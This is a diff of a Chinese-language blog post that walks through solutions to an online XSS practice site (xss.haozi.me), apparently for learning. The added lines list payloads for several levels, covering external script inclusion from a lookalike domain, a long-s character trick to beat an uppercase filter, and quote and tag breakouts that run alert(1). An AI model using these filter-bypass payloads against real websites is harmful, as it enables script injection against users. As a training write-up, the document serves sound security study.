@@ -7,8 +7,8 @@ date: 2019-10-29 01:01
 [TOC]
 
 ## 实验平台
-https://curtails.github.io/xss/
-https://xss.haozi.me
+[https://curtails.github.io/xss](https://curtails.github.io/xss/)  
+[https://xss.haozi.me](https://xss.haozi.me)
 
 ## xss-demo
 [github](https://github.com/haozi/xss-demo/)  
@@ -69,6 +69,12 @@ type=image src onerror
 https://www.segmentfault.com.haozi.me/j.js
 ```
 
+- 0x0a
+构造符合条件 只能引入外部js
+```
+https://www.segmentfault.com.haozi.me/j.js
+```
+
 - 0X0b
 标签、域名不区分大小写
 ```
@@ -90,4 +96,40 @@ alert(1)
 ```
 
 - 0x0e
+正则过滤<+英文字母 转化大写  
+使用`ſ` 古英语 转换为大写变成`S`
+```
+<ſcript src="https://xss.haozi.me/j.js"></script>
+```
+
+- 0x0f
+正则过滤 但是`&#39;`解码后仍然是'也就是说这个过滤是不起作用的  
+闭合括号即可
+```
+');alert('1   
+```
+
+- 0x10
+闭合括号没什么好说的
+```
+'';alert(1)
+```
+
+- 0x11
+javascript:console.log()js的调试功能 相当于控制台
+正则过滤了好多 但也是能直接闭合
+```
+"),alert(1)("
+```
+
+- 0x12
+直接new个script标签
+```
+</script><script>alert`1`;</script><script>
+```
+或
+```
+\");alert(1)//
+" 被转义成 \" 经过html解析后里面变成 console.log("\") 会报语法错误, 再补个 \ 即可
+```
 
